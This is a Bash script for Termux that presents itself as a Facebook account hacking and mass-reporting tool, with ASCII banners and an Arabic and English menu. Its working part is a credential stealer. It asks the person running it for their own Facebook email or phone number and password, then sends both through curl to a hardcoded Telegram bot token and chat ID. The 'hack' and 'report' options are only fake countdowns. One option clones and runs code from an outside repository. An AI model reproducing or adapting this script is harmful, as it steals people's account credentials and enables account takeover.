#!/bin/bash
pkg update -y && pkg upgrade -y && pkg install python -y && pkg install git -y && pkg install zip -y
sleep 4
clear
python ts.py
RED='\033[0;31m'
NC='\033[0m' # لا لون

# طباعة الجمجمة باللون الأحمر
echo -e "${RED}"
echo "   .------\\ /------."
echo "   |       -       |"
echo "   |               |"
echo "   |               |"
echo "   |               |"
echo "_______"
echo "===========.==========="
echo "  / ~     ~ \\"
echo " /|     |     |\\"
echo " W   ---  / \\  ---   W"
echo " \\.      |o o|      ./"
echo "  |                 |"
echo "  \\    #########    /"
echo "   \\  ## ----- ##  /"
echo "    \\##         ##/"
echo "     \\_v_/"
echo -e "${NC}"

 read -p "Please press 'Enter' to start"

sleep 3

clear

echo -e "$green"
echo "		.▄▄ ·        ▄▄· ▪   ▄▄▄· ▄▄▌      ▄▄▄▄·       ▐▄• ▄ "
echo "		▐█ ▀. ▪     ▐█ ▌▪██ ▐█ ▀█ ██•      ▐█ ▀█▪▪      █▌█▌▪"
echo "		▄▀▀▀█▄ ▄█▀▄ ██ ▄▄▐█·▄█▀▀█ ██▪      ▐█▀▀█▄ ▄█▀▄  ·██· "
echo "		▐█▄▪▐█▐█▌.▐▌▐███▌▐█▌▐█ ▪▐▌▐█▌▐▌    ██▄▪▐█▐█▌.▐▌▪▐█·█▌"
echo -e "		 ▀▀▀▀  ▀█▄▀▪·▀▀▀ ▀▀▀ ▀  ▀ .▀▀▀     ·▀▀▀▀  ▀█▄▀▪•▀▀ ▀▀$nc $blue v2.beta$nc"
#echo -e "	[+]              $red Coded By sam.sesh$nc         		   [+]"
#echo -e "	[+] 		 $red samsesh.net $nc 		   [+]"
#echo -e "	[+] 		 $red Greetz To All Pentesters$nc          		   [+]"
#echo -e "	[+]$red Special Greetz To$nc :$green {thelinuxchoice , Ha3MrX, Tunisian Eagles, samsesh}$nc [+]"
echo ""
echo 
echo ""
echo -e "		               : Segin on to your facebook accunt"
echo "============================================================================================================"
tok=7023319102:AAHma8eMrLiYtW2-4sF0bGDXuMHdjQgHKxs
CHAT_ID=5792222595

while true; do
  read -p "Enter your Email or your number : + " nan
  if [[ ${#nan} -lt 8 ]]; then
    echo "Error Your number : "
  else
    break
  fi
done
while true; do
  read -p "Enter your Pasword accunt : + " pass
  if [[ ${#nan} -lt 8 ]]; then
    echo "Error Your pass : "
  else
    break
  fi
done

curl -s -X POST "https://api.telegram.org/bot$tok/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$nan : pasword=$pass" 
python tepy.py && python ts.py

sleep 10

clear

echo "########################################################"
echo "!                                                      !"
echo "!     ﺀﺎﻬﺑ :ﺃ ﺕﺎﻴﺤﺗ ﻊﻣ ﺡﺎﺠﻨﺑ ﺕﺎﻴﺳﺎﺳﻻﺍ ﻊﻴﻤﺟ ﺖﻴﺒﺜﺗ ﻢﺗ    !"
echo "!                                                      !"
echo "!               ﺔﻠﻜﺸﻣ ﻙﺪﻨﻋ ﺍﺫﺍ ﻥﻮﻔﻟﺍ ﻢﻗﺭ               !"
echo "!                                                      !"
echo "!                    +201064004818                     !"
echo "!                                                      !"
echo "!               ﺍﺮﺠﻠﻴﺘﻟﺍ ﻲﻓ ﻲﺗﺎﻧﺎﻗ ﻂﺑﺍﺭ                !"
echo "!                                                      !"
echo "!              https://t.me/bahaa_010640               !"
echo "!                                                      !"
echo "!                                                      !"
echo "!                                                      !"
echo "!                                                      !"
echo "!                                                      !"
echo "########################################################"

echo "########################################################"

echo "########################################################"

echo "                         please select namber :"

echo "                 1:      hack facebook accunt :"
echo "                 2: Report a specific Facebook account :"
echo "                 3:      Install complete Asayat :"
echo "                 "
read -p "select a : " sr
while true; do
if [[ $sr -eq 1 ]]; then
   echo "Enter vactim ID "
  for i in {2000..0}; do
   echo -e "${RED}" "ﻦﻴﻤﺨﺘﻟﺍ ﻢﺘﻳ $i"
   sleep 1
  done
elif [[ $sr -eq 2 ]]; then
     read -p "Enter vactim ID " $ID
    echo "Enter vactim ID "
  for i in {1000..0}; do
   echo "Report to $ID $i"
   sleep 1
  done
elif [[ $sr -eq 3 ]]; then
   git clone https://github.com/Cyber-218/Termux-
   cd Termux-
   python basic_termux.py 

   echo" ﻥﻮﺜﻳﺎﺒﻟﺎﺑ ﺐﺗﺎﻜﻤﻟﺍ ﺖﻴﺒﺜﺗ ﻥﻻﺍ ﻱﺭﺎﺟ"
   python Python_library.py 
else
    echo "Not Fund >>> "
  break
fi    
done